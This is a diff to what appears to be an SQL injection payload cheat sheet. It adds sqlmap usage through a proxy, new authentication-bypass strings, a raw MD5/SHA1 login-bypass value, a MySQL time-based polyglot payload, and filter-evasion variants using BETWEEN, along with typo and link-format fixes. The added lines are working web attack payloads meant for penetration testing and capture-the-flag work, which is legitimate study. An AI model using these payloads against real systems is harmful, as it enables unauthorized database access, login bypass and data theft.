@@ -19,7 +19,19 @@ Attempting to manipulate SQL queries may have goals including:
 * [Entry point detection](#entry-point-detection)
 * [DBMS Identification](#dbms-identification)
 * [SQL injection using SQLmap](#sql-injection-using-sqlmap)
+  * [Basic arguments for SQLmap](#basic-arguments-for-sqlmap)
+  * [Load a request file and use mobile user-agent](#load-a-request-file-and-use-mobile-user-agent)
+  * [Custom injection in UserAgent/Header/Referer/Cookie](#custom-injection-in-useragentheaderreferercookie)
+  * [Second order injection](#second-order-injection)
+  * [Shell](#shell)
+  * [Crawl a website with SQLmap and auto-exploit](#crawl-a-website-with-sqlmap-and-auto-exploit)
+  * [Using TOR with SQLmap](#using-tor-with-sqlmap)
+  * [Using a proxy with SQLmap](#using-a-proxy-with-sqlmap)
+  * [Using Chrome cookie and a Proxy](#using-chrome-cookie-and-a-proxy)
+  * [Using suffix to tamper the injection](#using-suffix-to-tamper-the-injection)
+  * [General tamper option and tamper's list](#general-tamper-option-and-tampers-list)
 * [Authentication bypass](#authentication-bypass)
+  * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
 * [Polyglot injection](#polyglot-injection-multicontext)
 * [Routed injection](#routed-injection)
 * [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
@@ -41,6 +53,7 @@ Simple characters
 %3B
 )
 Wildcard (*)
+&apos;  # required for XML content
 ```
 
 Multiple encoding
@@ -169,6 +182,12 @@ sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threa
 sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
 ```
 
+### Using a proxy with SQLmap
+
+```powershell
+sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
+```
+
 ### Using Chrome cookie and a Proxy
 
 ```powershell
@@ -206,7 +225,7 @@ tamper=name_of_the_tamper
 |concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
 |charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
 |charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
-|equaltolike.py | Replaces all occurances of operator equal ('=') with operator 'LIKE'  |
+|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |
 |escapequotes.py | Slash escape quotes (' and ") |
 |greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
 |halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
@@ -270,6 +289,9 @@ tamper=name_of_the_tamper
 "&"
 "^"
 "*"
+'--'
+"--"
+'--' / "--"
 " or ""-"
 " or "" "
 " or ""&"
@@ -292,6 +314,7 @@ or 1=1--
 or 1=1#
 or 1=1/*
 admin' --
+admin' -- -
 admin' #
 admin'/*
 admin' or '2' LIKE '1
@@ -321,6 +344,7 @@ admin') or '1'='1'#
 admin') or '1'='1'/*
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 admin" --
+admin';-- azer 
 admin" #
 admin"/*
 admin" or "1"="1
@@ -343,7 +367,7 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
-## Authentication Bypass (Raw MD5)
+## Authentication Bypass (Raw MD5 SHA1)
 
 When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
 
@@ -355,6 +379,7 @@ Allowing an attacker to craft a string with a `true` statement such as `' or 'SO
 
 ```php
 md5("ffifdyop", true) = 'or'6�]��!r,��b
+sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
 ```
 
 Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
@@ -363,6 +388,9 @@ Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.
 
 ```sql
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
+
+/* MySQL only */
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
 ```
 
 ## Routed injection
@@ -421,12 +449,13 @@ SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
 SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
 ```
 
-No Equal - bypass using LIKE/NOT IN/IN
+No Equal - bypass using LIKE/NOT IN/IN/BETWEEN
 
 ```sql
 ?id=1 and substring(version(),1,1)like(5)
 ?id=1 and substring(version(),1,1)not in(4,3)
 ?id=1 and substring(version(),1,1)in(4,3)
+?id=1 and substring(version(),1,1) between 3 and 4
 ```
 
 Blacklist using keywords - bypass using uppercase/lowercase
@@ -442,7 +471,7 @@ Blacklist using keywords case insensitive - bypass using an equivalent operator
 ```sql
 AND   -> &&
 OR    -> ||
-=     -> LIKE,REGEXP, not < and not >
+=     -> LIKE,REGEXP, BETWEEN, not < and not >
 > X   -> not between 0 and X
 WHERE -> HAVING
 ```
@@ -499,25 +528,25 @@ mysql> mysql> select version();
   * [Manual SQL Injection Discovery Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
   * [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/)
 * MySQL:
-  * [PentestMonkey's mySQL injection cheat sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
-  * [Reiners mySQL injection Filter Evasion Cheatsheet] (https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
+  * [PentestMonkey's mySQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
+  * [Reiners mySQL injection Filter Evasion Cheatsheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
   * [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
   * [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
 * MSSQL:
-  * [EvilSQL's Error/Union/Blind MSSQL Cheatsheet] (http://evilsql.com/main/page2.php)
-  * [PentestMonkey's MSSQL SQLi injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
+  * [EvilSQL's Error/Union/Blind MSSQL Cheatsheet](http://evilsql.com/main/page2.php)
+  * [PentestMonkey's MSSQL SQLi injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
 * ORACLE:
-  * [PentestMonkey's Oracle SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
+  * [PentestMonkey's Oracle SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
 * POSTGRESQL:
-  * [PentestMonkey's Postgres SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
+  * [PentestMonkey's Postgres SQLi Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
 * Others
   * [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
-  * [Access SQLi Cheatsheet] (http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
-  * [PentestMonkey's Ingres SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
-  * [Pentestmonkey's DB2 SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
-  * [Pentestmonkey's Informix SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
-  * [SQLite3 Injection Cheat sheet] (https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
-  * [Ruby on Rails (Active Record) SQL Injection Guide] (http://rails-sqli.org/)
+  * [Access SQLi Cheatsheet](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
+  * [PentestMonkey's Ingres SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
+  * [Pentestmonkey's DB2 SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
+  * [Pentestmonkey's Informix SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
+  * [SQLite3 Injection Cheat sheet](https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
+  * [Ruby on Rails (Active Record) SQL Injection Guide](http://rails-sqli.org/)
   * [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
   * [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
   * [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
